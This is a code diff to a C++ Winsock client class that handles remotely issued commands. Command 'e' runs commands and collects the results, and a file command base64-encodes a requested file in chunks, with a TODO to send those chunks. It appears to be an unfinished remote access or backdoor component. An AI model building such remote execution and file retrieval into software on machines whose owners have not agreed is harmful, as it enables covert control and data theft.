@@ -9,6 +9,7 @@
 #include ".\libs\string++.h"
 #include ".\libs\b64++.h"
 #include ".\libs\execute.h"
+#include ".\libs\file++.h"
 
 #define CONFIG_FILE "./config.config"
 #pragma comment(lib, "ws2_32.lib")
@@ -169,25 +170,18 @@ class blooming_connection
         case 'f':
         {
             // TODO: figure out how to splite file in to chunks and send them.
-            fstream file;
-            map<int, char *> file_buffer;
-            char file_chunk_buffer[1024];
-            int file_chunk_counter = 0;
-            file.open(command_content);
-            if (file.is_open())
+            file_chunks file_chunk_buffer;
+            file_chunk_buffer = file_b64_encode((char *)command_content.c_str());
+
+            if (file_chunk_buffer[0] == "empty")
             {
-                command_type_identifer = "f";
-                while (!file.eof())
-                {
-                    file.read(file_chunk_buffer, 1024);
-                    file_buffer.insert(pair<int, char *>(file_chunk_counter, file_chunk_buffer));
-                    file_chunk_counter++;
-                }
-                file.close();
+                printf("Invaild path\n");
+                break;
             }
-            else
+
+            for (int i = 0; i < file_chunk_buffer.size(); i++)
             {
-                file.close();
+                printf("%s", file_chunk_buffer[i]);
             }
             break;
         }
@@ -227,8 +221,10 @@ class blooming_connection
         switch (command_type)
         {
         case 'd':
+        {
             printf("dl\n");
             break;
+        }
         case 'e':
         {
             vector<string> __execution_result_list;
@@ -261,17 +257,22 @@ class blooming_connection
             break;
         }
         case 'p':
+        {
             printf("--------------------\n");
             printf("@%s\t%s says:\n", str_now.c_str(), __id.c_str());
             printf("\t\t%s\n", b64_de(__data).c_str());
             printf("--------------------\n");
             break;
+        }
         case 'f':
+        {
             printf("file stream");
-
             break;
+        }
         default:
+        {
             printf("unknown\n");
+        }
         }
     }
 
